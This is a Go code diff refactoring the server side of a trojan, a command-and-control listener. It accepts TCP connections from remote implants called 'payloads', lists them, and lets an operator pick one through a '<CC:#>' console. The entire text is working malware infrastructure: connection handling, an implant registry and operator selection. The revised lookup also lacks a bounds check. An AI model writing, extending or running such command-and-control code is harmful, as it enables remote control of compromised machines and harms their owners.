@@ -1,4 +1,4 @@
-package cc
+package server
 
 import (
 	"bufio"
@@ -8,23 +8,21 @@ import (
 	"os"
 	"strconv"
 	"strings"
-
-	"gopkg.in/mgo.v2/bson"
 )
 
 // BufferSize is the amount of bytes being sent to the client
 // when uploading a file
 const BufferSize = 1024
 
-// CommandControl needs description
-type CommandControl struct {
+// Server is
+type Server struct {
 	Port     int
 	Target   string
 	Payloads []*Payload
 }
 
 // Run runs the trojan server
-func (c *CommandControl) Run() {
+func (c *Server) Run() {
 	addr := c.Target + ":" + strconv.Itoa(c.Port)
 	listener, err := net.Listen("tcp", addr)
 	if err != nil {
@@ -40,7 +38,7 @@ func (c *CommandControl) Run() {
 	c.handleConnections()
 }
 
-func (c *CommandControl) handleConnections() {
+func (c *Server) handleConnections() {
 	for {
 		fmt.Print("<CC:#> ")
 		// Read the stdin
@@ -54,12 +52,12 @@ func (c *CommandControl) handleConnections() {
 		// Check the command issued
 		switch {
 		case strings.TrimSpace(text) == "show":
-			for _, p := range c.Payloads {
-				fmt.Printf("ID: %s Address: %s\n", p.ID, p.Addr.String())
+			for i, p := range c.Payloads {
+				fmt.Printf("ID: %d Address: %s\n", i, p.Addr.String())
 			}
 		case strings.Contains(strings.TrimSpace(text), "use"):
-			addr := strings.Split(text, " ")[1]
-			p, err := c.getPayload(strings.TrimSpace(addr))
+			index := strings.Split(text, " ")[1]
+			p, err := c.getPayload(strings.TrimSpace(index))
 			if err != nil {
 				fmt.Println("[ERROR] getting payload", err)
 				continue
@@ -70,7 +68,7 @@ func (c *CommandControl) handleConnections() {
 	}
 }
 
-func (c *CommandControl) acceptConnections(listener net.Listener) {
+func (c *Server) acceptConnections(listener net.Listener) {
 	// Keep listening for connections
 	for {
 		conn, err := listener.Accept()
@@ -81,7 +79,6 @@ func (c *CommandControl) acceptConnections(listener net.Listener) {
 
 		// Create a new payload
 		p := &Payload{
-			ID:   bson.NewObjectId().Hex(),
 			Addr: conn.RemoteAddr(),
 			Conn: conn,
 		}
@@ -94,11 +91,15 @@ func (c *CommandControl) acceptConnections(listener net.Listener) {
 	}
 }
 
-func (c *CommandControl) getPayload(addr string) (*Payload, error) {
-	for _, p := range c.Payloads {
-		if p.Addr.String() == addr {
-			return p, nil
-		}
+func (c *Server) getPayload(index string) (*Payload, error) {
+	ii, err := strconv.Atoi(index)
+	if err != nil {
+		return nil, err
+	}
+	p := c.Payloads[ii]
+
+	if p != nil {
+		return p, nil
 	}
 
 	return nil, errors.New("payload not found")
